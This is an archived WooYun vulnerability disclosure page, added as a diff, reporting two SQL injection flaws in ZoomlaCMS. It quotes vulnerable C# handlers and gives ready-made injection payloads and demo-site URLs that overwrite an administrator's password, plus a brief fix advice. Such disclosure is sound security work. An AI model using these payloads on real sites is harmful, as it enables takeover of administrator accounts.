@@ -1,0 +1,267 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		逐浪CMS通用型SQL注入6+7（update型）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		逐浪CMS通用型SQL注入6+7（update型）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/wefgod">wefgod</a> 
+</li><li>提交时间：		2013-12-19 10:57</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-19：	细节已通知厂商并且等待厂商处理中<br/>
+									1970-01-01：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2013-12-24：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">好像没修复，友情来提交下。本来已经放弃了的</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">某功能还是存在两个UPDATE型注入，咱们可以秒改管理员密码。当然了也可以insert管理员的，为了避免一些问题就不用insert来测试了<br />
+<br />
+涉及的两个类：<br />
+<br />
+public class MIS_Project_ProQuote : Page, IRequiresSessionState<br />
+<br />
+public class MIS_Target_mailQuote : Page, IRequiresSessionState<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">注入点1：<br />
+<br />
+代码如下<br />
+<br />
+</p><pre><code>public class MIS_Project_ProQuote : Page, IRequiresSessionState<br />
+protected void Button1_Click(object sender, EventArgs e)<br />
+    {<br />
+        if (!string.IsNullOrEmpty(base.Request[&quot;types&quot;]) &amp;&amp; this.types == &quot;7&quot;)<br />
+        {<br />
+            string text = base.Request[&quot;id&quot;].ToString(); //ID参数<br />
+            string value = this.ProID.Value;<br />
+            if (!string.IsNullOrEmpty(value))<br />
+            {<br />
+                this.mps = this.bll.SelectByType(DataConverter.CLng(value));<br />
+                if (this.mps.TargetID.ToString() == &quot;&quot;)<br />
+                {<br />
+                    this.HiddenField1.Value = text;  //将ID参数赋值给隐藏域<br />
+                }<br />
+                else<br />
+                {<br />
+                    this.HiddenField1.Value = this.mps.TargetID + &quot;|&quot; + text;<br />
+                }<br />
+                this.bll.Update(&quot;TargetID=&#039;&quot; + this.HiddenField1.Value + &quot;&#039;&quot;, &quot;ID=&#039;&quot; + DataConverter.CLng(value) + &quot;&#039;&quot;);  //隐藏域没有过滤直接带入更新的查询，产生漏洞<br />
+                base.Response.Write(&quot;&lt;script&gt; location.href=&#039;Default.aspx?ID=&quot; + text + &quot;&#039;;&lt;/script&gt;&quot;);<br />
+            }<br />
+        }<br />
+    }</code></pre><p class='detail'><br />
+<br />
+注册前台用户<br />
+<br />
+访问：<br />
+<br />
+http://demo.zoomla.cn/mis/target/proquote.aspx?types=7&amp;id=1<br />
+<br />
+点击引用按钮<br />
+<br />
+改包<br />
+<br />
+</p><p class="detail"><a href="../images/1910393991e390e22b511d2cdc7c1e1665fcb764.png" target="_blank"><img src="../images/1910393991e390e22b511d2cdc7c1e1665fcb764.png" alt="t01a3ed9323afd40b5e.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/191039541337abd7983e983d558f605d2c655769.png" target="_blank"><img src="../images/191039541337abd7983e983d558f605d2c655769.png" alt="t017cba55f1f4bb81b7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+Proid输入随意的整数。<br />
+<br />
+将id修改为注入的代码：<br />
+<br />
+1&#039;;update zl_manager set adminpassword=&#039;77963b7a931377ad4ab5ad6a9cd718aa&#039; where adminname=&#039;test123&#039;;--<br />
+<br />
+此处注入和之前的不太一样。<br />
+<br />
+实际上这里是hidden的参数有问题，但是由于hidden参数要二次从id赋值，所以只要改ID这个参数即可，直接改hidden是无效的。<br />
+<br />
+查看测试管理员密码已经被修改：<br />
+<br />
+</p><p class="detail"><a href="../images/19104026317e41cef1b83a7ece6cec1b25e3dd00.png" target="_blank"><img src="../images/19104026317e41cef1b83a7ece6cec1b25e3dd00.png" alt="t016adc21e29ae1dfdd.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+注入点2：<br />
+<br />
+代码如下<br />
+<br />
+</p><pre><code>public class MIS_Target_mailQuote : Page, IRequiresSessionState<br />
+<br />
+    protected void Button1_Click(object sender, EventArgs e)<br />
+    {<br />
+        string value = this.ProID.Value;<br />
+        string str = string.Empty;<br />
+        if (!string.IsNullOrEmpty(base.Request[&quot;types&quot;]) &amp;&amp; base.Request[&quot;types&quot;] == &quot;8&quot;)<br />
+        {<br />
+            if (!string.IsNullOrEmpty(base.Request[&quot;ID&quot;]))<br />
+            {<br />
+                str = base.Request[&quot;id&quot;].ToString(); //漏洞点，id参数无过滤<br />
+            }<br />
+            if (!string.IsNullOrEmpty(value))<br />
+            {<br />
+                this.bminfo.Update(&quot;MID=&quot; + str, &quot;ID=&quot; + DataConverter.CLng(value)); //str变量直接带入更新操作<br />
+                if (!string.IsNullOrEmpty(base.Request[&quot;ParentID&quot;]))<br />
+                {<br />
+                    base.Response.Write(&quot;&lt;script&gt; window.Patent.location.reload(); &lt;/script&gt;&quot;);<br />
+                    return;<br />
+                }<br />
+                base.Response.Write(&quot;&lt;script&gt;window.Patent.location.reload();&lt;/script&gt;&quot;);<br />
+            }<br />
+        }<br />
+    }</code></pre><p class='detail'><br />
+<br />
+前台注册用户。<br />
+<br />
+http://demo.zoomla.cn/mis/target/mailquote.aspx?id=1;update zl_manager set adminpassword=&#039;08f8e0260c64418510cefb2b06eee5cd&#039; where adminname=&#039;test123&#039;;--&amp;types=8<br />
+<br />
+访问上面的链接后，点击引用！！！！截断一下<br />
+<br />
+然后改包，为下面的参数添加一个整型值：<br />
+<br />
+</p><p class="detail"><a href="../images/1910420543abdd1d3f1774e739aaeeaca0edab4f.png" target="_blank"><img src="../images/1910420543abdd1d3f1774e739aaeeaca0edab4f.png" alt="t01bf85ed4c816827c5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+查看数据库，发现测试用的管理员密码已经被修改了<br />
+<br />
+</p><p class="detail"><a href="../images/191042365dd4894710bfdafa74695828d3262ac3.png" target="_blank"><img src="../images/191042365dd4894710bfdafa74695828d3262ac3.png" alt="t01304ecc4900729bca.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤，参数化查询。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/wefgod" title="wefgod">wefgod</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046418" title="逐浪CMS通用型SQL注入6+7（update型）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-12-19 10:57</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46418";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
